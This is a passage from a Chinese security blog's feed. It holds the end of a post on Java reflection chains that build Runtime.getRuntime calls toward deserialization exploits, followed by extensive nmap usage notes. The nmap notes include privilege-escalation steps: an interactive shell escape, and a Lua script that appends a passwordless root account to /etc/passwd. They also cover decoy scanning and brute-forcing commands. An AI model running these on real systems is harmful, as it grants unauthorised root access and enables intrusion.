<span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span><span class="comment">//&lt;?&gt;... 表示任意类型任意数量的Class数组</span></span></span><br></pre></td></tr></table></figure></p><p>改成反射机制，得到getMethod这个方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Method method1= Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">        .getMethod(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;);<span class="comment">//根据getMethod方法接口进行封装</span></span><br></pre></td></tr></table></figure></p><p>指定obj：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下语句执行结果等同于Class.forName("java.lang.Runtime").getMethod(getRunime)</span></span><br><span class="line">method1.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//用于对比：以下语句等同于Class.forName("java.lang.Class").getMethod(getRunime)</span></span><br><span class="line"><span class="comment">//method1.invoke(Class.forName("java.lang.Class"),"getRuntime",new Class[0]);</span></span><br></pre></td></tr></table></figure></p><p>合起来就是<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br><span class="line"><span class="comment">// 经过变形的反射调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">    .getMethod(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;)<span class="comment">//得到getMethod方法</span></span><br><span class="line">    .invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></p><p>现在我们只是以<code>Class.forName(&quot;java.lang.Class&quot;)</code>开头获取到了Runtime类下的getRuntime方法。还没有执行。</p><h3 id="invoke-静态方法的obj不那么严格"><a href="#invoke-静态方法的obj不那么严格" class="headerlink" title="invoke 静态方法的obj不那么严格"></a>invoke 静态方法的obj不那么严格</h3><p>在调用invoke执行前，还需要讲另一个invoke非常神奇的特性，不那么严格校验的obj。<br>回顾之前总结的invoke传参规则：</p><blockquote><p>它的第一个参数是执行method的对象obj：</p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象 </li><li>如果这个方法是一个静态方法，那么第一个参数是类<br>它接下来的参数才是需要传入的参数。</li></ul></blockquote><p>传入的第一个参数其实不一定要是正确的类或者类对象!<br>看一下例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main函数</span></span><br><span class="line">Class.forName(<span class="string">"a"</span>).getMethod(<span class="string">"print"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">//内部类：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>按照规则，print函数是一个静态方法，实际上我们应该invoke传入一个a的类。但是以上代码的执行结果却是成功的：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7btszlp40j31ag0l6758.jpg" alt="invoke_obj不严格.png"></p><p>但是print不是静态方法时就会执行失败：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7btt38lc2j314u0nk0tx.jpg" alt="invoke_obj不严格_非startic.png"></p><p>这是因为invoke函数null抛出报错的机制导致的：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* <span class="meta">@exception</span> NullPointerException      </span><br><span class="line">* <span class="keyword">if</span> the specified object is <span class="keyword">null</span> and the method is an instance method. <span class="comment">//obj为null，并且method是一个实例method</span></span><br><span class="line">*/</span><br><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当method是一个普通函数时，传入obj不能为null，并且其类对象要与方法匹配<br>但是当method是一个静态函数时，就很随便了(可能是因为压根不会被用到吧)。</p><p>那么我们在调用getMethod的时候可不可以皮一下呢？<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method method = (Method) Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">    .getMethod(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;)<span class="comment">//得到getMethod方法</span></span><br><span class="line">    .invoke(<span class="keyword">null</span>,<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);<span class="comment">//这里invoke传入null</span></span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7btt9pcpvj31lq0bqabr.jpg" alt="getMethod_null.png"></p><p>报错自然是因为getMethod并不是static方法,所以不能为null了。<br>但是为什么getMethod不是static方法，但是invoke中却传入类而不是类实例呢……..<br>我是没有搞懂这个问题….但是感觉是因为是反射机制的函数的问题。由于已经花了太多时间，就不在这里继续纠结了。</p><blockquote><p>感谢潘大佬，点醒了；其实是看p牛的反射篇产生的误解，上文中所说的类，其实也是一个实例。类实例是其他类的实例，类实际上是class这个类的实例。<br>这边之前的疑问是，getMethod不是静态方法而invoke中传入的是类而不是类实例。<br>实际上因为getMethod本来就是class类中的方法，而<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>获取到的class类的实例<br>我们调用getMethod传入的不是之前的模糊类的概念，而是class类的实例（类实例），所以这里是没毛病的调用class类下的非静态方法，传入class类实例。</p></blockquote><p>但是Runtime.getRuntime就不一样了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object object0 = Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.String"</span>));</span><br><span class="line">Object object1 = Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">Object object2 = Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7bttfgc0dj31v20j40vy.jpg" alt="getRuntime_null.png"></p><p>突出一个随便，随性。</p><h3 id="回来继续构造调用"><a href="#回来继续构造调用" class="headerlink" title="回来继续构造调用"></a>回来继续构造调用</h3><p>上面我们只是获取到了getRuntime方法，我们还没有调用这个方法获取其Runtime对象<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通调用形式</span></span><br><span class="line">Runtime.getRuntime()</span><br><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))</span><br><span class="line"><span class="comment">// 经过变形的反射调用</span></span><br><span class="line">Method method = (Method) Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">                .getMethod(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;)<span class="comment">//得到getMethod方法</span></span><br><span class="line">                .invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);<span class="comment">//调用getMethod方法</span></span><br><span class="line"><span class="comment">//以上等于执行Class.forName("java.lang.Runtime").getMethod("getRuntime")</span></span><br><span class="line"><span class="comment">//调用Runtime.getRuntime函数，传入的obj根据上面的分析可以随便写</span></span><br><span class="line">method.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">method.invoke(<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">method.invoke(Class.forName(<span class="string">"java.lang.String"</span>),<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></p><p>至此，我们就换了一种方式去获取Runtime实例。<br>当然最后的getRuntime函数我们是直接反射调用的，在实际commons-collections利用中我们仍然需要跟得到getMethod一样用反射机制去获取invoke，然后再调用。<br>虽然在这里觉得1+1的问题为什么要1+1000-1000+1，兜兜转转挺傻乎乎的。但是在利用链的场景下，就会觉得：</p><p>卧槽….这个POC作者真是个人才。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>反射机制参考：<br><a href="https://www.cnblogs.com/wglIT/p/7590468.html" target="_blank" rel="noopener">https://www.cnblogs.com/wglIT/p/7590468.html</a><br><a href="https://www.cnblogs.com/yrstudy/p/6500982.html" target="_blank" rel="noopener">https://www.cnblogs.com/yrstudy/p/6500982.html</a><br>P神-java安全漫谈-反射机制1（知识星球-代码审计）<br>P神-java安全漫谈-反射机制2（知识星球-代码审计）<br>P神-java安全漫谈-反射机制3（知识星球-代码审计）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;java反射机制&quot;&gt;&lt;a href=&quot;#java反射机制&quot; class=&quot;headerlink&quot; title=&quot;java反射机制&quot;&gt;&lt;/a&gt;java反射机制&lt;/h2&gt;&lt;p&gt;真正反序列化漏洞的利用，还需要了解java反射原理。因为java反序列化的payload大多
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Tools-nmap使用</title>
    <link href="http://lalajun.com/2018/09/26/Tools-nmap/"/>
    <id>http://lalajun.com/2018/09/26/Tools-nmap/</id>
    <published>2018-09-26T09:05:28.000Z</published>
    <updated>2020-07-15T01:47:05.872Z</updated>
    
    <content type="html"><![CDATA[<p>— 总归是要补的…. —<br>— 终于补了一波自动化工具的使用 —</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>入职回头好好学习大把工具。<br>nmap基础学习笔记，感觉复习了计算机网络一样…<br>笔记笔记，常回来看看。<br>关于到script功能，和一些觉得不常用的功能，就没有记录了。</p><h2 id="官网中文文档"><a href="#官网中文文档" class="headerlink" title="官网中文文档"></a>官网中文文档</h2><p><a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="noopener">官网中文文档</a><br><a href="https://nmap.org/book/toc.html" target="_blank" rel="noopener">官网教程书籍</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol><li>扫描网段在线主机：<br><code>nmap -sP 192.168.0.0/24</code></li><li>扫描主机端口：<br><code>nmap -sS -P0 -sV -O 192.168.0.1</code> <code>nmap –PN –sT –sV –p1-65535 www.xxx.com</code></li><li>默认验证端口+默认脚本执行<br><code>nmap –sVC –p 1099 www.xxx.com</code><br>（扫描RMI服务细节）</li><li>简单粗暴全扫(默认-sT)：<br><code>nmap -A -sV -T4 192.168.0.1</code></li><li>隐蔽扫描：<br><code>nmap --spoof-mac Cisco --data-length 24 -T paranoid -max-hostgroup 1 --max-parallelism 10 -Pn -f -D 10.1.20.5,RND:5,ME -v -n -sS -sV -p T:1-1024 -oA ./out 10.1.1.15</code></li></ol><h2 id="nmap提权"><a href="#nmap提权" class="headerlink" title="nmap提权"></a>nmap提权</h2><p>因为nmap需要root权限进行扫描，在对方机器存在nmap时，可以进行提权</p><p>旧版本nmap:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure></p><p>新版本nmap:<br><code>file.nse</code><br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> file = <span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">"/etc/passwd"</span>, <span class="string">"a"</span>)</span><br><span class="line">file:<span class="built_in">write</span>(<span class="string">"root2::0:0::/root:/bin/bash\n"</span>)</span><br><span class="line">file:<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure></p><p><code>nmap --script=file.nse</code></p><h2 id="脚本使用"><a href="#脚本使用" class="headerlink" title="脚本使用"></a>脚本使用</h2><h3 id="脚本类别扫描"><a href="#脚本类别扫描" class="headerlink" title="脚本类别扫描"></a>脚本类别扫描</h3><p>nmap脚本可以进行分类扫描<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">auth: 负责处理鉴权证书（绕开鉴权）的脚本  </span><br><span class="line">broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  </span><br><span class="line">brute: 提供暴力破解方式，针对常见的应用如http/snmp等  </span><br><span class="line"><span class="keyword">default</span>: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  </span><br><span class="line">discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  </span><br><span class="line">dos: 用于进行拒绝服务攻击  </span><br><span class="line">exploit: 利用已知的漏洞入侵系统  </span><br><span class="line">external: 利用第三方的数据库或资源，例如进行whois解析  </span><br><span class="line">fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  </span><br><span class="line">malware: 探测目标机是否感染了病毒、开启了后门等信息  </span><br><span class="line">safe: 此类与intrusive相反，属于安全性脚本  </span><br><span class="line">version: 负责增强服务与版本扫描（Version Detection）功能的脚本  </span><br><span class="line">vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</span><br></pre></td></tr></table></figure></p><ol><li>扫描常见弱口令：<br><code>nmap --script=auth 192.168.137.*</code></li><li>对于各种端口进行简单爆破：<br><code>nmap --script=brute 192.168.137.*</code></li><li>扫描常见漏洞<br><code>nmap --script=vuln 10.71.144.3</code></li><li>局域网嗅探<br><code>nmap -n -p445 --script=broadcast 192.168.137.4</code></li><li>512端口开启rexecd Service服务的进行爆破<br><code>nmap -p 512 --script rexec-brute 10.71.144.3</code></li></ol><blockquote><p>rexeced Service爆破结束后进行利用<code>apt-get install rsh-client</code> <code>rlogin -l root 192.168.10.92</code></p></blockquote><ol><li>扫描nmap：<br><code>nmap -n -v -Pn –sV IP地址 -p 端口 --script=/usr/share/nmap/scripts/weblogic-t3-info.nse</code></li></ol><h2 id="目标地址"><a href="#目标地址" class="headerlink" title="目标地址"></a>目标地址</h2><h3 id="CIDR风格的地址"><a href="#CIDR风格的地址" class="headerlink" title="CIDR风格的地址"></a>CIDR风格的地址</h3><p><code>192.168.10.0/24</code>  = <code>192.168.10.0/24</code> = <code>192.168.10.0</code>-<code>192.168.10.255</code></p><p>根据IP地址的32个比特位固定，替换后面的比特位。可以从<code>/1</code>(半个互联网)到<code>/32</code>(一个主机)</p><h3 id="指定范围"><a href="#指定范围" class="headerlink" title="- 指定范围"></a>- 指定范围</h3><p><code>192.168.0-255.1-254</code> = C端下面所有地址，除了0,255<br><code>0-255.0-255.13.37</code> = 所有以13.37结束的地址。</p><h3 id="选项控制"><a href="#选项控制" class="headerlink" title="选项控制"></a>选项控制</h3><p><code>-iL &lt;inputfilename&gt;</code> (从列表中输入)<br>inputfilename：文件，文件内地址每一项必须以一个或多个空格，制表符或换行符分开</p><p><code>-iR &lt;hostnum&gt;</code> (随机选择目标)<br>hostnum：随机生成的IP数量，0表示无穷</p><p><code>--exclude &lt;host1[，host2][，host3]，...&gt;</code> (排除主机/网络) </p><p><code>--excludefile &lt;excludefile&gt;</code> (排除文件中的列表) </p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><blockquote><p>-sP选项可以和 除-P0之外的任何发现探测类型-P* 选项结合使用以达到更大的灵活性。 一旦使用了任何探测类型和端口选项，默认的探测(ACK和回应请求)就被覆盖了。</p></blockquote><p><code>-sL</code> (列表扫描)：<br>列出指定网络上的每台主机， 不发送任何报文到目标主机。再反向域名解析以获取 它们的名字。</p><p><code>-sP</code> (Ping扫描)：<br>打印出对Ping扫描做出响应的那些主机。 没有进一步的测试 (如端口扫描或者操作系统探测)。<br>在默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口。</p><p><code>-P0/-Pn</code> (无ping)：<br>完全跳过Nmap发现阶段。</p><p><code>-PS [portlist]</code> (TCP SYN Ping)：<br>该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 ，也可以通过 posrlist 参数指定 一个以逗号分隔的端口列表。<br>如：-PS 22，23，25，80，113，1050，35000<br>无论对方主机端口关闭回复RST还是端口开启回复SYN/ACK响应都告诉Nmap该主机正在运行。</p><p><code>-PA [portlist]</code> (TCP ACK Ping)：<br>设置了ACK标志位的空TCP报文。其他与上相同<br>远程主机应该总是回应一个RST报文， 因为它们并没有发出过连接请求到运行Nmap的机器，如果主机正在运行的话。 </p><blockquote><p>-PS -PA 提供SYN和ACK两种ping探测，使通过防火墙的机会尽可能大。可以尝试组合使用<br>默认端口可以通过nmap.h文件修改</p></blockquote><p><code>-PU [portlist]</code> (UDP Ping)：<br>设置了空的(除非指定了–data-length)UDP报文。如果不指定端口，默认是31338，portlist 设置与上相同</p><p>如果目标机器的端口是关闭的，UDP探测应该马上得到一个ICMP端口无法到达的回应报文，意味着主机正在运行。<br>许多其它类型的ICMP错误，像主机/网络无法到达或者TTL超时 再是没有回应 表示down掉的或者不可到达的主机。</p><blockquote><p>默认31338端口是因为它是一个极不可能被服务使用的端口。大部分服务会忽略 UDP空报文而不做任何回应，会混淆判断。<br>穿越只过滤TCP的防火墙和过滤器，达到主机发现目的。</p></blockquote><p><code>-PE; -PP; -PM</code> (ICMP Ping Types)：<br><strong>-PE</strong>：发送ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。表示主机正在运行<br><strong>-PP</strong>/<strong>-PM</strong>：发送ICMP 时间戳(type 13) / 地址掩码查询(type 17) 报文到目标IP地址，期待得到时间戳响应(type 14)或者地址掩码响应(type 18)，表示主机正在运行</p><blockquote><p>-PE 通常被封锁。-PP -PM 可能有效</p></blockquote><p><code>-PR</code> (ARP Ping)：<br>在局域网中，使用ARP扫描。<br>默认情况下，如果Nmap发现目标主机就在它所在的局域网上，它会进行ARP扫描。 即使指定了不同的ping类型(如 -PI或者 -PS) ，Nmap也会对任何相同局域网上的目标机使用ARP。 如果您真的不想要ARP扫描，指定 –send-ip。 </p><p><code>-n</code> (不用域名解析)<br>永不对它发现的活动IP地址进行反向域名解析。，加快速度</p><p><code>-R</code> (为所有目标解析域名)<br>永远 对目标IP地址作反向域名解析。</p><p><code>--system-dns</code> (使用系统域名解析器)<br>默认情况下，Nmap通过直接发送查询到您的主机上配置的域名服务器 来解析域名。为了提高性能，许多请求 (一般几十个 ) 并发执行。如果您希望使用系统自带的解析器，就指定该选项。</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><blockquote><p>默认使用<code>-sT</code>模式扫描</p></blockquote><p><code>-sS</code> (TCP SYN扫描)：<br>默认，快速，半开放式扫描。</p><ul><li>发送一个SYN报文，等待响应。SYN/ACK 表示端口在监听(开放)。</li><li>RST(复位)表示没有监听。</li><li>数次重发没有响应，收到ICMP不可达错误，表示被过滤</li></ul><p><code>-sT</code> (TCP connect()扫描)：<br>SYN不可用是，此为默认选项<br>完全连接到开放端口，速度慢，会留下记录。</p><p><code>-sU</code> (UDP扫描)：<br>UDP扫描较慢，比TCP更困难，扫描UDP服务<br>可以与TCP扫描 结合来使用同时检查两种协议。</p><ul><li>UDP发送空的（没有数据）UDP报头到每个目标端口。</li><li>响应UDP报文，该端口是open。</li><li>几次重试没有响应，该端口open | filtered</li><li>其他ICMP不可达错误（类型3，代码1,2,9,10,13），表示端口filtered</li><li>返回ICMP端口不可达错误（类型3，代码3），表示端口closed</li></ul><blockquote><p>比如 DNS,SNMP,DHCP(端口53,161/162,67/68)是基于UDP的服务<br><code>-sV</code>版本扫描帮助区分 open 和 filtered</p></blockquote><p><code>-sN; -sF; -sX</code> (TCP Null, FIN, and Xmas扫描)<br>如果扫描系统遵循<a href="http://www.rfc-editor.org/rfc/rfc793.txt" target="_blank" rel="noopener">TCP RFC</a>。当端口关闭时，任何不包含SYN,RST或者ACK的报文会导致 一个RST返回；当端口开放是，应该没有任何响应。<br>只要不包含SYN,RST,ACK,任何其他三种(FIN,PSH,URG)的组合都行，Nmap中提供三种扫描类型：<br><strong>Null扫描(-sN)</strong>:不设置任何标志位（TCP标志头为0）<br><strong>FIN扫描(-sF)</strong>:只设置TCP FIN标志位<br><strong>Xmas扫描(-sX)</strong>:设置FIN,PSH,URG标志位</p><p>以上三种扫描的处理都一样</p><ul><li>收到RST报文，被认为是close。 </li><li>没有响应,被认为是 open | filtered。</li><li>收到ICMP不可达错误（类型3，代号1,2,3,9,10,13)被认为是 filtered</li></ul><blockquote><p>优势：能躲过一些无状态的防火墙和报文过滤路由器，隐蔽<br>劣势：并非所有系统都严格遵守RFC 793，可能误报。不能区别open和filtered</p></blockquote><p><code>-sA</code>(TCP ACK扫描)：<br>用于发现防火墙规则，看哪些端口是被过滤的。ACK扫描探测报文只设置ACK标志位</p><ul><li>返回RST报文，被认为是unfiltered。无法细分 open | close端口</li><li>不响应的端口 或者 发送特定的ICMP错误消息（类型3，代号1,2,3,9,10,13)，被认为是 filtered</li></ul><p><code>-sW</code>(TCP窗口扫描)：<br>在ACK扫描的基础上，通过 返回的RST的报文的TCP窗口 来进一步区分 unfiltered 中的 open 和 close。</p><blockquote><p>在某些系统，开放端口用正数表示窗口大小（RST报文也是如此）而关闭端口的窗口大小为0。<br>针对这种实现而形成的扫描类型。不能总是相信，作为参考。来区分端口</p></blockquote><p><code>-sM</code>(TCP Maimon扫描)：<br>由发现者Uriel Maimon命名。<br>扫描技术与Null，FIN，以及Xmas扫描完全一致。只是修改探测报文为FIN/ACK</p><p><code>--scanflags</code> (定制的TCP扫描)：<br>允许你通过指定任意TCP标志位来设计自己的扫描发送的报文，此外设置扫描类型可以告诉Nmap如何解释响应。</p><ul><li>–scanflags URGACKPSHRSTSYNFIN 设置所有标志位</li><li>-sA 的基本类型来解析响应包（不指定，默认SYN扫描形式）</li></ul><p><code>-sl &lt;zombie host[:probeport]&gt;</code> 空闲扫描：<br>利用处于空闲状态僵尸机的IP ID增长数量来判断目标端口的开放情况。一种类似于侧信道从其他地方获取结果的攻击方式，极其隐蔽，细节参考<a href="https://nmap.org/book/idlescan.html" target="_blank" rel="noopener">官方说明</a><br>步骤如下：</p><ul><li>向zombie机器发送SYN/ACK包，目的是记录IP ID</li><li>伪造zombie机器与目标发送SYN建立连接</li><li>向zombie机器发送SYN/ACK包，目的是再次记录IP ID<br>如果IP ID 增长2 表示目标机端口open（目标机发送SYN/ACK至zombie，zombie返回RST）<br>如果IP ID 增长1 表示目标机端口close | filtered （目标机发送RST至zombie，zombie不反应）</li></ul><blockquote><p>IP ID 就是IP报文的报文头中的标识段，主机在发送报文时增长，接受报文不增长。增长2 = 1（发送至目标机） + 1（发送至攻击者主机）</p></blockquote><p><code>-sO</code> (IP协议扫描)：<br>IP协议扫描可以选择目标机支持哪些IP协议（TCP,ICMP,IGMP等）<br>遍历扫描的是协议号</p><h2 id="端口说明和扫描顺序"><a href="#端口说明和扫描顺序" class="headerlink" title="端口说明和扫描顺序"></a>端口说明和扫描顺序</h2><blockquote><p>默认情况，Nmap用指定的协议对端口1-1024以及nmap-service文件中更高的端口进行扫描。<br>默认情况下，Nmap按随机顺序扫描端口 (除了出于效率的考虑，常用的端口前移)。</p></blockquote><p><code>-p &lt;port ranges&gt;</code>(只扫描指定端口)<br>指定想要扫描的端口，覆盖默认值。<br>-p 后 可以通过<code>U:</code>,<code>T:</code>指定端口使用的协议（之前要指定-sU，和一种TCP扫描类型-sS，-sF，-sT）<br>如果不给协议限定符，会添加到所有协议列表。</p><p><code>-F</code>(快速(有限端口)扫描)：<br>扫描nmap的nmap-services文件中的指定端口。</p><p><code>-r</code>(不要按随机顺序扫描端口)：<br>顺序端口扫描。 </p><h2 id="服务和版本探测"><a href="#服务和版本探测" class="headerlink" title="服务和版本探测"></a>服务和版本探测</h2><blockquote><p>默认情况下，Nmap版本探测会跳过9100 TCP端口（打印机端口有大量无用信息）</p></blockquote><p><code>-sV</code>(版本探测)：<br>打开版本探测</p><p><code>-A</code>：<br>打开操作系统探测和版本探测</p><p><code>--allports</code>(不为版本探测排除任何端口)：<br>探测所有端口</p><p><code>--version-intensity &lt;intensity&gt;</code>(设置版本扫描强度)：<br>强度值必须在0-9之间，默认是7。指数越高，服务越可能被正确识别。<br><code>--version-light</code>(打开轻量级模式)：<br>等于 –verison-intensity 2<br><code>--verison-all</code>(尝试每个探测)：<br>等于 –version-intensity 9</p><p><code>--version-trace</code>(跟踪版本扫描活动)：<br>打印出详细正在进行的扫描调试信息。是<code>--packet-trace</code>的子集。</p><p><code>-sR</code>(RPC扫描)：<br>和许多端口扫描方法联合使用。对所有被发现开放的TCP/UDP端口，探测是否有RPC端口以及其程序和版本号。</p><h2 id="操作系统检测"><a href="#操作系统检测" class="headerlink" title="操作系统检测"></a>操作系统检测</h2><p><code>-O</code>(启动系统探测)：<br>打开系统探测</p><p><code>-A</code>：<br>打开操作系统探测和版本探测</p><p><code>--osscan-limit</code>(针对指定的目标进行操作系统探测)：<br>如果发现一个打开和关闭的TCP端口时，检测会更有效。<br>nmap只对满足这种条件的主机进行操作系统探测。</p><p><code>--osscan-guess; --fuzzy</code>(推测操作系统检测结果)</p><h2 id="时间和性能"><a href="#时间和性能" class="headerlink" title="时间和性能"></a>时间和性能</h2><p><code>-T &lt;0-5&gt;</code>(设置时间模板)：</p><p>默认为 -T3。数字越大，扫描越快。<br>2比3多花10倍时间，1和2避免IDS告警。</p><p>其他细节设置略过</p><h2 id="防火墙-IDS躲避和哄骗"><a href="#防火墙-IDS躲避和哄骗" class="headerlink" title="防火墙/IDS躲避和哄骗"></a>防火墙/IDS躲避和哄骗</h2><p>可以 报文分段，诱饵隐蔽，源地址哄骗，使用指定的接口，源端口哄骗，家随机数据，MAC地址哄骗</p><p>其他细节设置略过</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p><code>-oN &lt;filespec&gt;</code>(标准输出)：<br>将标准输出直接写入指定的文件。</p><p><code>-oX &lt;filespec&gt;</code>(XML输出)：<br>要求XML输出直接写入指定的文件。</p><p><code>-v</code>(提高输出信息的详细度)：<br>输出扫描过程的更多信息。可以使用<code>-vv</code>提供更详细的信息</p><p><code>-d [level]</code>(提高或设置调试级别)：<br>输出调试信息</p><p><code>--packet-trace</code>(跟踪发送和接受的报文)：<br>要求Nmap打印发送和接收的每个报文的摘要，通常用于 调试。</p><p><code>--resume &lt;filename&gt;</code>(继续中断的扫描)：<br>可以通过输出的日志文件，继续扫描</p><p>其他细节设置略过</p><h2 id="其他选项"><a href="#其他选项" class="headerlink" title="其他选项"></a>其他选项</h2><p><code>-A</code> (激烈扫描模式选项)：<br>包括操作系统检测(-O)和版本检测(-sV)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 总归是要补的…. —&lt;br&gt;— 终于补了一波自动化工具的使用 —&lt;/p&gt;
    
    </summary>
    
    
      <category term="tools" scheme="http://lalajun.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>0day-NEO智能合约平台Runtime.Notify调用拒绝服务漏洞</title>
